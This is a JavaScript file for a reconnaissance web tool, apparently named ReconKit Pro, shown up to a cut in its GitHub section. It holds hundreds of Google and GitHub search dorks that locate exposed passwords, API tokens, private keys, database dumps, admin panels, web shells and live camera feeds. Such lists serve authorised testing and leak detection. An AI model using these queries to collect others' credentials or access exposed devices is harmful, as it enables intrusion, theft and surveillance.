// ReconKit Pro app logic - extracted from reconkit-pro.html
// ════════════════════════════════════════════════════════════
// TAB SWITCHING
// ════════════════════════════════════════════════════════════
function switchTab(name){
  document.querySelectorAll('.tab-pane').forEach(p=>p.classList.remove('active'));
  document.getElementById('tab-'+name).classList.add('active');
  document.querySelectorAll('#mainNav button').forEach(b=>b.classList.remove('active'));
  const clicked=window.event?.currentTarget;
  const btn=clicked?.closest?.('#mainNav')?clicked:document.querySelector(`#mainNav button[onclick*="'${name}'"]`);
  if(btn)btn.classList.add('active');
  if(name==='github'&&!ghInited){initGHDorks();}
  if(name==='jwt'&&!jwtInited){initJWT();}
  if(name==='secrets'&&!secretInited){initSecretScanner();}
  if(name==='urlintel'&&!urlIntelInited){initUrlIntel();}
  if(name==='policy'&&!policyInited){initPolicyBuilder();}
  if(name==='headers'&&!headerInited){initHeaderChecker();}
  if(name==='iframe'&&!iframeInited){initIframeChecker();}
  if(name==='cookie'&&!cookieInited){initCookie();}
}
function switchInnerTab(id,group,btn){
  document.querySelectorAll('.inner-pane').forEach(p=>p.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  document.querySelectorAll('.inner-tab').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
}

function setTheme(name,btn){
  const allowed=['hacker','neon','ghost','ember'];
  if(!allowed.includes(name))name='hacker';
  document.body.classList.remove(...allowed.map(t=>'theme-'+t));
  document.body.classList.add('theme-'+name);
  localStorage.setItem('rk.theme',name);
  document.querySelectorAll('.theme-btn').forEach(b=>b.classList.toggle('active',b===btn||b.dataset.theme===name));
}

// ════════════════════════════════════════════════════════════
// CLIPBOARD UTILS
// ════════════════════════════════════════════════════════════
function copyText(t){
  navigator.clipboard.writeText(t).then(()=>showToast());
}
function copyEl(id){
  const el=document.getElementById(id);
  const txt=el.innerText||el.textContent;
  copyText(txt.replace(/^⎘/,'').trim());
}
function showToast(){
  const t=document.getElementById('toast');
  t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'),1800);
}

// ════════════════════════════════════════════════════════════
// GOOGLE DORKS DATA
// ════════════════════════════════════════════════════════════
const googleDorks=[
  // SENSITIVE FILES
  {cat:'Sensitive Files',q:'filetype:log "username" "password"',d:'Log files with credentials'},
  {cat:'Sensitive Files',q:'filetype:sql "insert into" "password"',d:'SQL dumps with password inserts'},
  {cat:'Sensitive Files',q:'filetype:env "DB_PASSWORD"',d:'.env files with database passwords'},
  {cat:'Sensitive Files',q:'filetype:cfg "password"',d:'Config files containing passwords'},
  {cat:'Sensitive Files',q:'filetype:bak inurl:"htpasswd"',d:'Backup files of htpasswd'},
  {cat:'Sensitive Files',q:'filetype:xml intext:"connectionString"',d:'XML files with DB connection strings'},
  {cat:'Sensitive Files',q:'filetype:reg "HKEY_CURRENT_USER" "password"',d:'Windows registry exports with passwords'},
  {cat:'Sensitive Files',q:'filetype:pem "PRIVATE KEY"',d:'Exposed PEM private key files'},
  {cat:'Sensitive Files',q:'filetype:ppk "PRIVATE KEY"',d:'PuTTY private key files'},
  {cat:'Sensitive Files',q:'filetype:key "-----BEGIN RSA"',d:'RSA private keys'},
  {cat:'Sensitive Files',q:'filetype:json "api_key" OR "apikey"',d:'JSON files with API keys'},
  {cat:'Sensitive Files',q:'filetype:yaml "password:" site:github.com',d:'YAML config files on GitHub'},

  // LOGIN PAGES
  {cat:'Login Pages',q:'inurl:"/admin/login"',d:'Admin login pages'},
  {cat:'Login Pages',q:'inurl:"/wp-login.php"',d:'WordPress login pages'},
  {cat:'Login Pages',q:'inurl:"/login.php" intext:"admin"',d:'PHP login pages with admin text'},
  {cat:'Login Pages',q:'intitle:"Admin Panel" inurl:"admin"',d:'Admin panel pages'},
  {cat:'Login Pages',q:'intitle:"Login" inurl:"portal"',d:'Portal login pages'},
  {cat:'Login Pages',q:'inurl:"/cpanel" intitle:"cPanel"',d:'cPanel login pages'},
  {cat:'Login Pages',q:'inurl:"/phpmyadmin/" intitle:"phpMyAdmin"',d:'phpMyAdmin instances'},
  {cat:'Login Pages',q:'inurl:"/manager/html" intitle:"Tomcat"',d:'Apache Tomcat manager'},
  {cat:'Login Pages',q:'intitle:"Kibana" inurl:":5601"',d:'Exposed Kibana dashboards'},
  {cat:'Login Pages',q:'intitle:"Grafana" inurl:":3000"',d:'Grafana dashboard instances'},

  // CONFIG & BACKUP
  {cat:'Config & Backup',q:'inurl:"/.git" intitle:"Index of"',d:'Exposed .git directories'},
  {cat:'Config & Backup',q:'intitle:"Index of" ".env"',d:'Directory listing with .env files'},
  {cat:'Config & Backup',q:'inurl:"/backup" intitle:"Index of"',d:'Backup directories exposed'},
  {cat:'Config & Backup',q:'filetype:conf "server_name" nginx',d:'Nginx config files'},
  {cat:'Config & Backup',q:'filetype:conf "apache" "ServerName"',d:'Apache config files'},
  {cat:'Config & Backup',q:'intitle:"Index of" "wp-config.php.bak"',d:'WordPress config backups'},
  {cat:'Config & Backup',q:'inurl:"docker-compose.yml" site:github.com',d:'Docker compose files on GitHub'},
  {cat:'Config & Backup',q:'filetype:ini "password" -sample -test',d:'INI files with passwords'},
  {cat:'Config & Backup',q:'intitle:"Index of" ".ssh"',d:'Exposed SSH directories'},
  {cat:'Config & Backup',q:'inurl:"/.DS_Store" intitle:"Index of"',d:'macOS .DS_Store files'},

  // INFO DISCLOSURE
  {cat:'Info Disclosure',q:'intitle:"index of" server.key',d:'Server private keys in directory listing'},
  {cat:'Info Disclosure',q:'intext:"Powered by" "phpMyAdmin" intitle:"Welcome"',d:'phpMyAdmin welcome pages'},
  {cat:'Info Disclosure',q:'intext:"php.ini" filetype:txt',d:'PHP ini configuration exposed'},
  {cat:'Info Disclosure',q:'intitle:"Apache Status" "Apache Server Status"',d:'Apache server status pages'},
  {cat:'Info Disclosure',q:'intitle:"Rails Error" "RuntimeError"',d:'Ruby on Rails stack traces'},
  {cat:'Info Disclosure',q:'intitle:"Django DebugToolbar"',d:'Django debug toolbar exposed'},
  {cat:'Info Disclosure',q:'intext:"Warning: mysql_connect()" filetype:php',d:'MySQL connection errors in PHP'},
  {cat:'Info Disclosure',q:'intitle:"Swagger UI" inurl:"/api-docs"',d:'Exposed Swagger API docs'},
  {cat:'Info Disclosure',q:'intitle:"phpinfo()" "PHP Version"',d:'PHP info pages exposed'},
  {cat:'Info Disclosure',q:'intext:"Index of /" intitle:"laravel" filetype:log',d:'Laravel log files'},

  // VULNERABILITIES
  {cat:'Vulnerabilities',q:'inurl:"page=../../../../" filetype:php',d:'PHP LFI vulnerability indicators'},
  {cat:'Vulnerabilities',q:'inurl:"cmd=&cmdline=" OR inurl:"shell.php"',d:'Possible web shells'},
  {cat:'Vulnerabilities',q:'inurl:"?redirect=" OR inurl:"?url=" inurl:"http"',d:'Open redirect parameters'},
  {cat:'Vulnerabilities',q:'inurl:"upload.php" -intext:"successfully"',d:'File upload forms'},
  {cat:'Vulnerabilities',q:'inurl:".php?id=" intext:"SQL syntax"',d:'Potential SQLi endpoints'},
  {cat:'Vulnerabilities',q:'inurl:eval( filetype:php site:github.com',d:'eval() usage in PHP on GitHub'},
  {cat:'Vulnerabilities',q:'intext:"Sorry, an error has occurred" inurl:"login"',d:'Error-leaking login pages'},
  {cat:'Vulnerabilities',q:'inurl:"?debug=true" OR inurl:"?debug=1"',d:'Debug mode enabled in GET params'},
  {cat:'Vulnerabilities',q:'inurl:"/cgi-bin/viewcvs.cgi"',d:'ViewCVS repository viewers'},
  {cat:'Vulnerabilities',q:'inurl:"wp-content/plugins/" intitle:"Index of"',d:'WordPress plugin directory listings'},

  // CLOUD STORAGE
  {cat:'Cloud Storage',q:'site:s3.amazonaws.com "AccessKeyId"',d:'AWS S3 buckets with access keys'},
  {cat:'Cloud Storage',q:'site:s3.amazonaws.com intitle:"Bucket" "Index of"',d:'Open S3 bucket listings'},
  {cat:'Cloud Storage',q:'site:blob.core.windows.net filetype:pdf',d:'Azure Blob Storage PDF files'},
  {cat:'Cloud Storage',q:'site:storage.googleapis.com "credentials"',d:'Google Cloud Storage credentials'},
  {cat:'Cloud Storage',q:'site:pastebin.com "s3.amazonaws.com" "password"',d:'AWS credentials on Pastebin'},
  {cat:'Cloud Storage',q:'site:docs.google.com inurl:"spreadsheets" "API key"',d:'Google Docs with API keys'},
  {cat:'Cloud Storage',q:'site:onedrive.live.com "password"',d:'OneDrive files with passwords'},
  {cat:'Cloud Storage',q:'site:dropbox.com "confidential" filetype:pdf',d:'Dropbox confidential PDFs'},

  // DATABASE
  {cat:'Database',q:'intitle:"phpMyAdmin" "running on" inurl:"main.php"',d:'phpMyAdmin running instances'},
  {cat:'Database',q:'inurl:":27017" intitle:"MongoDB"',d:'Exposed MongoDB instances'},
  {cat:'Database',q:'intitle:"Elasticsearch" inurl:":9200"',d:'Exposed Elasticsearch instances'},
  {cat:'Database',q:'inurl:":6379" intitle:"Redis"',d:'Exposed Redis instances'},
  {cat:'Database',q:'filetype:sql "create database" "insert into users"',d:'SQL dump with user table'},
  {cat:'Database',q:'inurl:"adminer.php" intitle:"Adminer"',d:'Adminer database manager'},
  {cat:'Database',q:'intext:"ORA-00933" OR intext:"ORA-01756"',d:'Oracle SQL errors (SQLi test)'},
  {cat:'Database',q:'intext:"pg_query(): Query failed" filetype:php',d:'PostgreSQL errors in PHP'},

  // CAMERAS & IoT
  {cat:'Cameras & IoT',q:'intitle:"Live View / – AXIS" inurl:view.shtml',d:'AXIS IP cameras live view'},
  {cat:'Cameras & IoT',q:'inurl:"/view.shtml" intitle:"Live View"',d:'Network camera live feeds'},
  {cat:'Cameras & IoT',q:'intitle:"webcamXP" inurl:":8080"',d:'WebcamXP surveillance cameras'},
  {cat:'Cameras & IoT',q:'intitle:"D-Link" inurl:"/cgi-bin/viewer.cgi"',d:'D-Link IP camera viewers'},
  {cat:'Cameras & IoT',q:'intitle:"Hikvision" "Channel 01"',d:'Hikvision IP cameras'},
  {cat:'Cameras & IoT',q:'intitle:"RouterOS" inurl:":8291"',d:'MikroTik router management'},
  {cat:'Cameras & IoT',q:'inurl:"/dana-na/auth/url_default/welcome.cgi"',d:'Juniper VPN login pages'},

  // API KEYS
  {cat:'API Keys',q:'inurl:"googleapis.com" intext:"key="',d:'Google API key exposure'},
  {cat:'API Keys',q:'site:pastebin.com "AAAA" "Twilio"',d:'Twilio API keys on Pastebin'},
  {cat:'API Keys',q:'site:pastebin.com "sk_live_" "stripe"',d:'Stripe live secret keys'},
  {cat:'API Keys',q:'site:github.com "xoxb-" OR "xoxp-"',d:'Slack tokens on GitHub'},
  {cat:'API Keys',q:'site:pastebin.com "AIza" "Google"',d:'Google API keys on Pastebin'},
  {cat:'API Keys',q:'filetype:json "client_secret" site:github.com',d:'OAuth client secrets on GitHub'},
  {cat:'API Keys',q:'site:github.com "BEGIN RSA PRIVATE KEY"',d:'RSA private keys on GitHub'},

  // CREDENTIALS
  {cat:'Credentials',q:'intext:"username" intext:"password" filetype:csv',d:'CSV files with credentials'},
  {cat:'Credentials',q:'intext:"admin" intext:"password" filetype:xls',d:'Excel files with admin passwords'},
  {cat:'Credentials',q:'site:pastebin.com "username:password"',d:'Credential dumps on Pastebin'},
  {cat:'Credentials',q:'intitle:"Index of" passwd.txt',d:'passwd.txt files in open directories'},
  {cat:'Credentials',q:'filetype:txt intext:"username" intext:"email" intext:"password"',d:'Text credential files'},
  {cat:'Credentials',q:'inurl:"password" filetype:log',d:'Password in log files'},

  // ADMIN PANELS
  {cat:'Admin Panels',q:'intitle:"Webmin" inurl:":10000"',d:'Webmin admin panel'},
  {cat:'Admin Panels',q:'intitle:"Plesk" inurl:":8443"',d:'Plesk control panel'},
  {cat:'Admin Panels',q:'intitle:"WHM" inurl:":2087"',d:'WHM control panel'},
  {cat:'Admin Panels',q:'intitle:"DirectAdmin" inurl:":2222"',d:'DirectAdmin panel'},
  {cat:'Admin Panels',q:'intitle:"GLPI" inurl:"/glpi"',d:'GLPI IT management panel'},
  {cat:'Admin Panels',q:'intitle:"Zabbix" inurl:"/zabbix"',d:'Zabbix monitoring panel'},
  {cat:'Admin Panels',q:'intitle:"Nagios" inurl:"/nagios"',d:'Nagios monitoring UI'},
  {cat:'Admin Panels',q:'intitle:"Piwik" inurl:"/piwik"',d:'Piwik/Matomo analytics panel'},

  // ERROR MESSAGES
  {cat:'Error Messages',q:'intext:"Fatal error" "Uncaught exception" filetype:php',d:'PHP fatal errors'},
  {cat:'Error Messages',q:'intext:"Warning: include()" filetype:php',d:'PHP include warnings (LFI vectors)'},
  {cat:'Error Messages',q:'intext:"SQLSTATE[HY000]" filetype:php',d:'PDO SQL errors'},
  {cat:'Error Messages',q:'intext:"DEBUG" intext:"SQLSTATE" filetype:json',d:'JSON API debug responses'},
  {cat:'Error Messages',q:'intitle:"Error 500" "Internal Server Error" inurl:".php"',d:'PHP 500 error pages'},
  {cat:'Error Messages',q:'intext:"at sun.reflect.NativeMethodAccessorImpl"',d:'Java stack trace exposure'},
  {cat:'Error Messages',q:'intext:"Traceback (most recent call last)" filetype:py',d:'Python traceback in public files'},
];

// Adds 500 extra Google dorks while keeping the source compact and searchable.
// The generated entries stay inside the existing 12 UI categories.
(function expandGoogleDorks(){
  const target=googleDorks.length+500;
  const seen=new Set(googleDorks.map(d=>d.q));
  const add=(cat,q,d)=>{
    if(googleDorks.length>=target||seen.has(q))return;
    seen.add(q);
    googleDorks.push({cat,q,d});
  };
  const each=(items,fn)=>{
    for(const item of items){
      if(googleDorks.length>=target)return;
      fn(item);
    }
  };
  const exts=['7z','accdb','backup','bak','bkp','bz2','cfg','cnf','conf','config','csv','dat','db','dbf','dmp','doc','docm','docx','dump','env','gz','inc','ini','jar','json','key','kdbx','keystore','lic','lock','log','mdb','old','ora','ovpn','p12','pem','pfx','properties','pub','rdp','reg','rsa','sql','sqlite','sqlite3','swp','tar','tf','tfstate','toml','txt','xls','xlsm','xlsx','xml','yaml','yml','zip'];
  each(exts,ext=>{
    add('Sensitive Files',`ext:${ext} ("password" OR "passwd" OR "secret")`,`${ext.toUpperCase()} files containing password or secret terms`);
    add('Sensitive Files',`intitle:"index of" "*.${ext}" ("backup" OR "dump" OR "private")`, `Open directory listing with .${ext} files`);
    add('Config & Backup',`inurl:backup ext:${ext}`,`Backup paths exposing .${ext} files`);
    add('Config & Backup',`inurl:old ext:${ext} ("config" OR "database" OR "users")`, `Old .${ext} files with configuration/data hints`);
    add('Info Disclosure',`ext:${ext} ("internal use only" OR "confidential" OR "restricted")`, `Sensitive document markers in .${ext} files`);
  });

  const secretTerms=['access_token','api_key','apikey','auth_token','aws_access_key_id','aws_secret_access_key','client_secret','connection_string','consumer_secret','database_url','db_password','firebase_api_key','github_token','google_api_key','jwt_secret','mail_password','mongodb_uri','mysql_password','oauth_secret','password','private_key','redis_password','refresh_token','secret_access_key','secret_key','sendgrid_api_key','session_secret','signing_key','slack_token','smtp_password','stripe_secret','token','twilio_auth_token','webhook_secret'];
  each(secretTerms,term=>{
    add('API Keys',`"${term}" ("sk_live_" OR "AKIA" OR "AIza" OR "xoxb-" OR "ghp_")`,`${term} near common token prefixes`);
    add('Credentials',`"${term}" filetype:env OR filetype:yml OR filetype:json`,`${term} in environment/config formats`);
    add('Config & Backup',`intitle:"index of" "${term}"`,`${term} visible in directory listings`);
    add('Info Disclosure',`"${term}" ("example.com" OR "localhost" OR "127.0.0.1")`,`${term} around host/config values`);
  });

  const paths=['admin','administrator','api','api-docs','auth','backup','beta','billing','console','cpanel','dashboard','debug','demo','dev','download','export','graphql','internal','jenkins','jira','kibana','legacy','login','logs','manager','metrics','monitor','oauth','old','portal','private','qa','reports','sandbox','signin','sso','staging','status','swagger','test','tmp','uat','upload','webadmin','webhook','webmail','wp-admin'];
  each(paths,path=>{
    add('Login Pages',`inurl:${path} (intitle:"login" OR intitle:"sign in" OR intitle:"admin")`,`${path} login or admin surface`);
    add('Admin Panels',`intitle:"${path}" (inurl:admin OR inurl:manager OR inurl:console)`,`${path} management panel title`);
    add('Info Disclosure',`inurl:${path} ("stack trace" OR "debug" OR "error")`,`${path} debug/error disclosure`);
    add('Vulnerabilities',`inurl:${path} ("upload" OR "file" OR "redirect" OR "callback")`,`${path} endpoints with interesting action keywords`);
  });

  const params=['callback','continue','debug','dest','destination','dir','download','file','folder','from','host','id','image','include','item','load','module','next','page','path','q','query','redirect','ref','return','returnTo','returnUrl','search','target','template','to','token','uri','url','view'];
  each(params,param=>{
    add('Vulnerabilities',`inurl:${param}= ("http" OR "https" OR "%2f" OR "../")`,`${param}= parameter with redirect/path-like values`);
    add('Vulnerabilities',`inurl:${param}= inurl:"?"`,`${param}= parameter discovery`);
    add('Info Disclosure',`inurl:${param}= ("debug=true" OR "trace=true" OR "verbose=true")`,`${param}= near debug flags`);
  });

  const clouds=['s3.amazonaws.com','storage.googleapis.com','blob.core.windows.net','digitaloceanspaces.com','firebaseio.com','firebasestorage.googleapis.com','cloudfront.net','azurewebsites.net','herokuapp.com','vercel.app','netlify.app','pages.dev','workers.dev','supabase.co','render.com','railway.app'];
  each(clouds,host=>{
    add('Cloud Storage',`site:${host} ("password" OR "secret" OR "backup" OR "dump")`,`${host} storage or platform exposure`);
    add('Cloud Storage',`site:${host} ("index of" OR "AccessDenied" OR "ListBucketResult")`,`${host} listing/error fingerprint`);
    add('Cloud Storage',`site:${host} ("config" OR "credentials" OR "database")`,`${host} config/credential terms`);
  });

  const dbTerms=['mysql','postgres','postgresql','mongodb','redis','mariadb','mssql','oracle','sqlite','elasticsearch','solr','cassandra','dynamodb','firebase','neo4j','influxdb'];
  each(dbTerms,db=>{
    add('Database',`"${db}" ("password" OR "connection string" OR "database_url")`,`${db} connection string hints`);
    add('Database',`"${db}" ("SQL syntax" OR "query failed" OR "stack trace")`,`${db} public error traces`);
    add('Database',`intitle:"index of" "${db}" ("dump" OR "backup" OR ".sql")`,`${db} dump/backup directory listings`);
  });

  const iot=['axis','hikvision','d-link','tplink','ubiquiti','mikrotik','routeros','webcamxp','ip camera','printer','nas','synology','qnap','dvr','nvr','webcam'];
  each(iot,term=>{
    add('Cameras & IoT',`intitle:"${term}" ("live view" OR "login" OR "setup")`,`${term} exposed interface discovery`);
    add('Cameras & IoT',`inurl:"${term}" (intitle:"admin" OR intitle:"login")`,`${term} admin/login discovery`);
  });
})();

const GD_PER_PAGE=25;
let gdPage=1;
let gdFiltered=googleDorks;

function catClass(cat){
  const m={'Sensitive Files':'files','Login Pages':'login','Config & Backup':'config','Info Disclosure':'info','Vulnerabilities':'vuln','Cloud Storage':'cloud','Database':'db','Cameras & IoT':'cam','API Keys':'api','Credentials':'creds','Admin Panels':'login','Error Messages':'info'};
  return 'cat-'+(m[cat]||'info');
}

function renderGoogleDorks(){
  const q=(document.getElementById('gdSearch').value||'').toLowerCase();
  const cat=document.getElementById('gdCat').value;
  gdFiltered=googleDorks.filter(d=>{
    const matchCat=!cat||d.cat===cat;
    const matchQ=!q||(d.q.toLowerCase().includes(q)||d.d.toLowerCase().includes(q)||d.cat.toLowerCase().includes(q));
    return matchCat&&matchQ;
  });
  gdPage=1;
  document.getElementById('gd-count').textContent=googleDorks.length;
  renderGDPage();
}

function renderGDPage(){
  document.getElementById('gd-filtered').textContent=gdFiltered.length;
  const start=(gdPage-1)*GD_PER_PAGE;
  const slice=gdFiltered.slice(start,start+GD_PER_PAGE);
  const tbody=document.getElementById('gdTable');
  tbody.innerHTML=slice.map((d,i)=>`
    <tr>
      <td style="color:var(--text-dim);font-size:10px;">${start+i+1}</td>
      <td class="category"><span class="cat-badge ${catClass(d.cat)}">${d.cat}</span></td>
      <td class="dork-code">${escHtml(d.q)}</td>
      <td class="desc">${escHtml(d.d)}</td>
      <td>
        <button class="copy-btn" onclick="copyDork('${escQ(d.q)}',this)" title="Copy dork">⎘</button>
        <button class="copy-btn" onclick="searchGoogle('${escQ(d.q)}')" title="Open in Google">🔍</button>
      </td>
    </tr>`).join('');
  renderGDPagination();
}

function renderGDPagination(){
  const total=Math.ceil(gdFiltered.length/GD_PER_PAGE);
  const p=document.getElementById('gdPagination');
  if(total<=1){p.innerHTML='';return;}
  let html=`<div class="page-info">Page ${gdPage} of ${total} · ${gdFiltered.length} results</div><div class="page-controls">`;
  html+=`<button class="page-btn" onclick="gdGoPage(${gdPage-1})" ${gdPage===1?'disabled':''}>‹ Prev</button>`;
  for(let i=1;i<=Math.min(total,7);i++){
    if(i===1||i===total||Math.abs(i-gdPage)<=2){
      html+=`<button class="page-btn ${i===gdPage?'active':''}" onclick="gdGoPage(${i})">${i}</button>`;
    } else if(Math.abs(i-gdPage)===3){html+='<span style="color:var(--text-dim);padding:0 4px;">…</span>';}
  }
  html+=`<button class="page-btn" onclick="gdGoPage(${gdPage+1})" ${gdPage===total?'disabled':''}>Next ›</button></div>`;
  p.innerHTML=html;
}
function gdGoPage(n){gdPage=n;renderGDPage();document.getElementById('tab-google').scrollTo(0,0);}
function copyDork(q,btn){copyText(q);btn.textContent='✓';btn.classList.add('copied');setTimeout(()=>{btn.textContent='⎘';btn.classList.remove('copied');},1500);}
function searchGoogle(q){window.open('https://www.google.com/search?q='+encodeURIComponent(q),'_blank');}
function copyAllGdork(){copyText(gdFiltered.map(d=>d.q).join('\n'));showToast();}

// ════════════════════════════════════════════════════════════
// GITHUB DORKS DATA — 1600+ patterns across 18 categories
// ════════════════════════════════════════════════════════════
const ghCategories=[
  {name:'AWS Credentials',color:'creds'},
  {name:'API Keys & Tokens',color:'api'},
  {name:'Passwords & Secrets',color:'creds'},
  {name:'Private Keys',color:'files'},
  {name:'Database Connection',color:'db'},
  {name:'OAuth & JWT',color:'info'},
  {name:'Cloud Provider Secrets',color:'cloud'},
  {name:'CI/CD & DevOps',color:'config'},
  {name:'Third-party Services',color:'api'},
  {name:'Environment Files',color:'config'},
  {name:'Internal Endpoints',color:'info'},
  {name:'Source Code Secrets',color:'vuln'},
  {name:'SSH & Certificates',color:'files'},
  {name:'Containers & K8s',color:'config'},
  {name:'Hardcoded Credentials',color:'creds'},
  {name:'Slack & Communication',color:'api'},
  {name:'Payment & Finance',color:'creds'},
  {name:'Misc Sensitive',color:'info'},
];

const ghDorksRaw=[
  // AWS CREDENTIALS
  ['AWS Credentials','filename:.env AWS_ACCESS_KEY_ID','AWS access keys in .env files'],
  ['AWS Credentials','filename:.env AWS_SECRET_ACCESS_KEY','AWS secret keys in .env files'],
  ['AWS Credentials','extension:yml AWS_ACCESS_KEY_ID NOT homeassistant','AWS keys in YAML configs'],
  ['AWS Credentials','extension:json AWS_SECRET_ACCESS_KEY','AWS secrets in JSON'],
  ['AWS Credentials','"aws_access_key_id" extension:cfg','Access keys in CFG files'],
  ['AWS Credentials','"aws_secret_access_key" extension:properties','Secret keys in Java properties'],
  ['AWS Credentials','AKIAIOSFODNN7EXAMPLE','Example access key used in real configs'],
  ['AWS Credentials','"AWSSecretKey" extension:xml','AWS secret in XML config'],
  ['AWS Credentials','filename:credentials aws_access_key_id','AWS credentials file'],
  ['AWS Credentials','filename:.aws "aws_access_key_id"','AWS config directory'],
  ['AWS Credentials','"s3.amazonaws.com" "AWS_ACCESS_KEY"','S3 with access key reference'],
  ['AWS Credentials','extension:sh "export AWS_SECRET"','AWS secret in shell scripts'],
  ['AWS Credentials','"aws_session_token" extension:json','AWS session tokens'],
  ['AWS Credentials','filename:config "aws_access_key_id" NOT test NOT sample','Real AWS keys in configs'],
  ['AWS Credentials','"AWS_ACCESS_KEY_ID=AKIA" extension:env','AWS key format in env file'],
  ['AWS Credentials','"arn:aws:iam::" "aws_secret"','IAM ARN with secrets'],
  ['AWS Credentials','"AWS.config.update" "accessKeyId"','AWS SDK with hardcoded keys'],
  ['AWS Credentials','extension:py boto3.client "aws_access_key_id"','boto3 with hardcoded keys'],
  ['AWS Credentials','"EC2_ACCESS_KEY" extension:env','EC2 access keys'],
  ['AWS Credentials','"AWS_DEFAULT_REGION" "AWS_SECRET_ACCESS_KEY"','AWS region with secret'],
  // API KEYS & TOKENS
  ['API Keys & Tokens','filename:.env "GOOGLE_API_KEY"','Google API keys in .env'],
  ['API Keys & Tokens','extension:json "api_key" NOT sample','API keys in JSON files'],
  ['API Keys & Tokens','"Authorization: Bearer" extension:js NOT test','Bearer tokens in JS'],
  ['API Keys & Tokens','"api_token" extension:yaml NOT example','API tokens in YAML'],
  ['API Keys & Tokens','"X-API-KEY:" extension:py NOT sample','API key header in Python'],
  ['API Keys & Tokens','filename:config.js apikey','API keys in config.js'],
  ['API Keys & Tokens','extension:rb "api_key"','API keys in Ruby'],
  ['API Keys & Tokens','"MAILGUN_API_KEY" extension:env','Mailgun API keys'],
  ['API Keys & Tokens','"SENDGRID_API_KEY" extension:env','SendGrid API keys'],
  ['API Keys & Tokens','"TWILIO_AUTH_TOKEN" extension:env','Twilio auth tokens'],
  ['API Keys & Tokens','"MAPBOX_API_TOKEN" extension:js','MapBox tokens in JS'],
  ['API Keys & Tokens','"FIREBASE_API_KEY" extension:json','Firebase API keys'],
  ['API Keys & Tokens','filename:application.properties "api.key"','API key in Spring properties'],
  ['API Keys & Tokens','"token" "secret" extension:json NOT test NOT sample','Tokens with secrets in JSON'],
  ['API Keys & Tokens','"apiKey" "secretKey" extension:yaml','API and secret keys in YAML'],
  ['API Keys & Tokens','filename:.netrc password','Passwords in .netrc files'],
  ['API Keys & Tokens','extension:js "APIKey" NOT vendor','API keys in JS'],
  ['API Keys & Tokens','"OPENAI_API_KEY" extension:env','OpenAI API keys'],
  ['API Keys & Tokens','"ANTHROPIC_API_KEY" extension:py','Anthropic API keys in Python'],
  ['API Keys & Tokens','"GROQ_API_KEY" extension:env','Groq API keys'],
  // PASSWORDS & SECRETS
  ['Passwords & Secrets','filename:.env "DB_PASSWORD"','Database passwords in .env'],
  ['Passwords & Secrets','extension:env "PASSWORD="','Generic passwords in env files'],
  ['Passwords & Secrets','filename:config.php "password"','Passwords in PHP config'],
  ['Passwords & Secrets','extension:json "password" NOT test NOT sample NOT dummy','Real passwords in JSON'],
  ['Passwords & Secrets','"secret_key" extension:py NOT test','Secret keys in Python'],
  ['Passwords & Secrets','filename:secrets.yml','Secrets YAML files'],
  ['Passwords & Secrets','filename:secrets.json','Secrets JSON files'],
  ['Passwords & Secrets','filename:credentials.json','Credential JSON files'],
  ['Passwords & Secrets','extension:xml "password" NOT test NOT sample','Passwords in XML'],
  ['Passwords & Secrets','filename:.htpasswd','HTTP password files'],
  ['Passwords & Secrets','filename:shadow','Unix shadow password files'],
  ['Passwords & Secrets','extension:properties "password=" NOT test','Passwords in Java properties'],
  ['Passwords & Secrets','filename:database.yml "password:"','DB passwords in Rails database.yml'],
  ['Passwords & Secrets','"admin_password" extension:env','Admin passwords in env'],
  ['Passwords & Secrets','extension:rb "password" NOT test NOT spec','Passwords in Ruby'],
  ['Passwords & Secrets','filename:wp-config.php "DB_PASSWORD"','WordPress database passwords'],
  ['Passwords & Secrets','filename:settings.py "SECRET_KEY"','Django secret keys'],
  ['Passwords & Secrets','filename:.env "MAIL_PASSWORD"','Mail passwords in .env'],
  ['Passwords & Secrets','extension:go "password" "hardcoded"','Hardcoded passwords in Go'],
  ['Passwords & Secrets','"master_password" extension:json','Master passwords in JSON'],
  // PRIVATE KEYS
  ['Private Keys','extension:pem "PRIVATE KEY"','PEM private key files'],
  ['Private Keys','extension:key "PRIVATE KEY"','KEY format private keys'],
  ['Private Keys','"BEGIN RSA PRIVATE KEY" extension:rsa','RSA private keys'],
  ['Private Keys','"BEGIN EC PRIVATE KEY"','Elliptic curve private keys'],
  ['Private Keys','"BEGIN DSA PRIVATE KEY"','DSA private keys'],
  ['Private Keys','"BEGIN OPENSSH PRIVATE KEY"','OpenSSH private keys'],
  ['Private Keys','filename:id_rsa NOT .pub','RSA SSH private keys'],
  ['Private Keys','filename:id_dsa NOT .pub','DSA SSH private keys'],
  ['Private Keys','filename:id_ecdsa NOT .pub','ECDSA SSH private keys'],
  ['Private Keys','filename:id_ed25519 NOT .pub','Ed25519 SSH private keys'],
  ['Private Keys','"-----BEGIN PGP PRIVATE KEY BLOCK-----"','PGP private keys'],
  ['Private Keys','extension:ppk "PRIVATE KEY"','PuTTY private key files'],
  ['Private Keys','filename:server.key extension:key','Web server private keys'],
  ['Private Keys','"keyPassword" extension:xml','Key passwords in XML (Android)'],
  ['Private Keys','filename:signing.key','Code signing keys'],
  // DATABASE CONNECTION
  ['Database Connection','extension:env "DATABASE_URL"','Database URLs in .env'],
  ['Database Connection','"mongodb://.*:.*@" extension:js','MongoDB URIs with credentials'],
  ['Database Connection','"mysql://.*:.*@" extension:py','MySQL connection strings'],
  ['Database Connection','"postgresql://.*:.*@"','PostgreSQL connection strings'],
  ['Database Connection','"redis://:.*@" extension:yml','Redis URIs with auth'],
  ['Database Connection','filename:database.yml "username:" "password:"','Rails DB config with creds'],
  ['Database Connection','extension:env "MONGO_URI"','MongoDB URI in .env'],
  ['Database Connection','"SQLALCHEMY_DATABASE_URI" extension:py','SQLAlchemy connection strings'],
  ['Database Connection','"connectionString" "password" extension:json','DB connection strings in JSON'],
  ['Database Connection','extension:xml "jdbc:.*password"','JDBC connection strings'],
  ['Database Connection','filename:db.php "password" extension:php','PHP DB files with passwords'],
  ['Database Connection','"Data Source=.*Password=" extension:cs','C# database connection strings'],
  ['Database Connection','extension:env "DB_PASS"','DB passwords in .env (short form)'],
  ['Database Connection','"cassandra" "password" extension:yaml','Cassandra credentials'],
  ['Database Connection','extension:conf "pg_password"','PostgreSQL passwords in conf'],
  // OAUTH & JWT
  ['OAuth & JWT','"JWT_SECRET" extension:env','JWT secrets in .env'],
  ['OAuth & JWT','"client_secret" extension:json NOT test','OAuth client secrets'],
  ['OAuth & JWT','"OAUTH_CLIENT_SECRET" extension:env','OAuth secrets in .env'],
